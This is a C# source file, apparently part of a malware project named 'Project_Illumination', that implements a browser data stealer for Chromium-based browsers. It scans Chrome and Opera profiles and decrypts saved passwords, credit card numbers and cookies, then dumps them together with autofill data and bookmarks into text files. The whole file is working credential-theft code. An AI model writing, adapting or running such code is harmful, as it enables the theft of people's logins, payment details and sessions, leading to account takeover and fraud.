using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace Project_Illumination.Exploits.Browsers
{
    internal class Chromium : IBrowser
    {
        private readonly string _path;
        private readonly List<string> _autoFillData, _passwords, _cookies, _paymentInformation, _bookmarks;

        public Chromium()
        {
            _path = $@"{Paths.SAVE_PATH}\Browsers\Chromium";
            _autoFillData = new List<string>();
            _passwords = new List<string>();
            _cookies = new List<string>();
            _paymentInformation = new List<string>();
            _bookmarks = new List<string>();

            Directory.CreateDirectory(_path);
        }

        public void Run()
        {
            Parallel.ForEach(Paths.CHROMIUM_PATHS, path =>
            {
                var fullPath = path.Contains("Opera Software") ? Paths.ROAMING + path : Paths.LOCAL + path;

                if (!Directory.Exists(fullPath)) return;

                Parallel.ForEach(Directory.GetDirectories(fullPath), profile =>
                {
                    GetAutoFill($@"{profile}\Web Data");
                    GetPaymentInformation($@"{profile}\Web Data");
                    GetPasswords($@"{profile}\Login Data");
                    GetCookies($@"{profile}\Cookies");
                    GetBookmarks($@"{profile}\Bookmarks");
                });
            });

            if (_autoFillData.Count > 0)
                File.WriteAllText($@"{_path}\auto_fill.txt", string.Join("\n", _autoFillData));

            if (_paymentInformation.Count > 0)
                File.WriteAllText($@"{_path}\payment_information.txt", string.Join("\n", _paymentInformation));

            if (_passwords.Count > 0)
                File.WriteAllText($@"{_path}\passwords.txt", string.Join("\n", _passwords));

            if (_cookies.Count > 0)
                File.WriteAllText($@"{_path}\cookies.txt", string.Join("\n", _cookies));

            if (_bookmarks.Count > 0)
                File.WriteAllText($@"{_path}\bookmarks.txt", string.Join("\n", _bookmarks));
        }

        public void GetPaymentInformation(string path)
        {
            var sqlReader = SQLite.ReadTable(path, "credit_cards");
            if (sqlReader == null) return;

            for (var i = 0; i < sqlReader.GetRowCount(); i++)
            {
                var number = Crypto.GetUTF8(Crypto.EasyDecrypt(path, sqlReader.GetValue(i, 4)));
                var expiration = $"{Crypto.GetUTF8(sqlReader.GetValue(i, 2))}/{Crypto.GetUTF8(sqlReader.GetValue(i, 3))}";
                var name = Crypto.GetUTF8(sqlReader.GetValue(i, 1));

                _paymentInformation.Add($@"{name} | {number} | {expiration}");
            }
        }

        public void GetAutoFill(string path)
        {
            var sqlReader = SQLite.ReadTable(path, "autofill");
            if (sqlReader == null) return;

            for (var i = 0; i < sqlReader.GetRowCount(); i++)
            {
                _autoFillData.Add($@"{Crypto.GetUTF8(sqlReader.GetValue(i, 0))} | {Crypto.GetUTF8(sqlReader.GetValue(i, 1))}");
            }
        }

        public void GetPasswords(string path)
        {
            var sqlReader = SQLite.ReadTable(path, "logins");
            if (sqlReader == null) return;

            for (var i = 0; i < sqlReader.GetRowCount(); i++)
            {
                var url = Crypto.GetUTF8(sqlReader.GetValue(i, 0));
                var username = Crypto.GetUTF8(sqlReader.GetValue(i, 3));
                var password = Crypto.GetUTF8(Crypto.EasyDecrypt(path, sqlReader.GetValue(i, 5)));

                if (string.IsNullOrEmpty(password)) continue;

                _passwords.Add($@"{url} | {username} | {password}");
            }
        }
        public void GetBookmarks(string filePath)
        {
            if (!File.Exists(filePath)) return;

            var serializer = new JavaScriptSerializer();
            dynamic json = serializer.Deserialize<object>(File.ReadAllText(filePath, System.Text.Encoding.UTF8));

            foreach (var bookmarkType in json["roots"].Values)
            {
                if (!bookmarkType.TryGetValue("children", out dynamic _)) continue;

                foreach (var bookmark in bookmarkType["children"])
                {
                    if (!bookmark.TryGetValue("name", out dynamic _) || !bookmark.TryGetValue("url", out dynamic _)) continue;

                    _bookmarks.Add($@"{bookmark["name"]} | {bookmark["url"]}");
                }
            }
        }

        public void GetCookies(string path)
        {
            var sqlReader = SQLite.ReadTable(path, "cookies");
            if (sqlReader == null) return;

            for (var i = 0; i < sqlReader.GetRowCount(); i++)
            {
                var expirationEpoch = Crypto.GetUTF8(sqlReader.GetValue(i, 5));
                var expirationDate = DateTimeOffset.FromUnixTimeSeconds(long.Parse(expirationEpoch) / 1000000 - 11644473600).DateTime;
                if (expirationDate < DateTime.Now) continue;

                var rawCookieValue = sqlReader.GetValue(i, 12);
                if (rawCookieValue == null) continue;

                var cookieValue = Crypto.EasyDecrypt(path, rawCookieValue);
                if (cookieValue == "") cookieValue = sqlReader.GetValue(i, 3);

                var hostKey = Crypto.GetUTF8(sqlReader.GetValue(i, 1));
                var cookieName = Crypto.GetUTF8(sqlReader.GetValue(i, 2));
                var cookiePath = Crypto.GetUTF8(sqlReader.GetValue(i, 4));
                var isSecure = Crypto.GetUTF8(sqlReader.GetValue(i, 6).ToUpper());

                _cookies.Add($@"{hostKey} | {cookieName} | {cookiePath} | {cookieValue} | {expirationEpoch} | {isSecure}");
            }
        }
    }
}
